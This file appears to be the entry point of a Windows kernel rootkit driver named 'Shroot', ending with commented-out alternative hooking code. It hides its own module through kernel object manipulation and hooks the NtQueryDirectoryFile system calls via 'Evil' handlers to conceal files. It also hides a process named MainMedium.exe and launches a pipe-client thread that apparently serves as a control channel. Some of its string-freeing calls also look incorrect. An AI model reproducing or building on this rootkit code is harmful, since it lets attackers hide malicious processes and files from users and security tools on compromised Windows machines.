#include "piping.h"
#include "DKOM.h"
//#include "minifilter.h"
#pragma warning(disable : 4996)


extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
    UNICODE_STRING NtQueryName = { 0 };
    UNICODE_STRING NtQueryExName = { 0 };
    RtlInitUnicodeString(&NtQueryName, L"NtQueryDirectoryFile");
    RtlInitUnicodeString(&NtQueryExName, L"NtQueryDirectoryFileEx");
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = ShrootUnload;

    
    // Hide KMDFdriver system module from loaded modules list:
    if (!NT_SUCCESS(kernelobjs_hiding::HideSystemModule(DriverObject, NULL))) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, 'HkQr', &NtQueryName))) {
        ShrootUnload(DriverObject);
        RtlFreeUnicodeString(&NtQueryName);
        RtlFreeUnicodeString(&NtQueryExName);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, 'HkQx', &NtQueryExName))) {
        ShrootUnload(DriverObject);
        RtlFreeUnicodeString(&NtQueryName);
        RtlFreeUnicodeString(&NtQueryExName);
        return STATUS_UNSUCCESSFUL;
    }
    RtlFreeUnicodeString(&NtQueryName);
    RtlFreeUnicodeString(&NtQueryExName);


    // Hook all file handling functions initially and save their original data:
    /*
    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", TRUE, 'HkQr'))) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", TRUE, 'HkQx'))) {
         ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
    }


    if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", 'HkQx'))) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (roothook::SystemServiceDTHook(L"NtQueryDirectoryFile", &roothook::EvilQueryDirectoryFile) == NULL) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(FilterGeneral::RegisterDriverAsMinifilter(DriverObject))) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(FilterGeneral::StartFilteringWithMinifilter())) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }
    */
    if (!NT_SUCCESS(process::HideProcess(0, "MainMedium.exe", TRUE))) {
        ShrootUnload(DriverObject);
        return STATUS_UNSUCCESSFUL;
    }


    const char* HelloMessage =
        "\n----------\n"
        " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
        "/ ____\\ | | | || ___  \\  _  |/  _  \\_    _/| / //_  _\\\\_   _/\n"
        "\\ `- -. | |_| || |_/  / | | || | | | | | | |/ /  | |    | |\n"
        " `- -. \\   _  ||     /| | | || | | | | | |    \\  | |    | |\n"
        "/\\__/  /  | | || |\\  \\\\ \\_/ /| \\_/ / | | | |\\  \\_| |_   | |\n"
        "\\____ / \\_| |_|| / \\__|\\___/ \\____/  |_| |_| \\_/\\___/   |_|\n\n"
        "Discord: bldysis#0868  GitHub: shaygitub\n"
        "\n----------\n";

    DbgPrintEx(0, 0, "%s", HelloMessage);

    
    // Execute pipe client thread:
    HANDLE PipeThread = NULL;
    NTSTATUS status = PsCreateSystemThread(
        &PipeThread,
        GENERIC_ALL,
        NULL,
        NULL,
        NULL,
        (PKSTART_ROUTINE)PipeClient,
        NULL);

    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", status);
        return STATUS_UNSUCCESSFUL;
    }
    ZwClose(PipeThread);
     return STATUS_SUCCESS;
}



/*
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    //UNREFERENCED_PARAMETER(DriverObject);  // When using manual mapper - cannot use this parameter
    UNREFERENCED_PARAMETER(RegistryPath);  // When using manual mapper - cannot use this parameter
    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics");  // Call the hook handler to handle a call for specific hooking
    NTSTATUS status = STATUS_SUCCESS;
    DbgPrintEx(0, 0, "KMDFdriver LOADED\n");
    DbgPrintEx(0, 0, "KMDFdriver RegistryPath: %wZ\n", RegistryPath);
    return status;
}
*/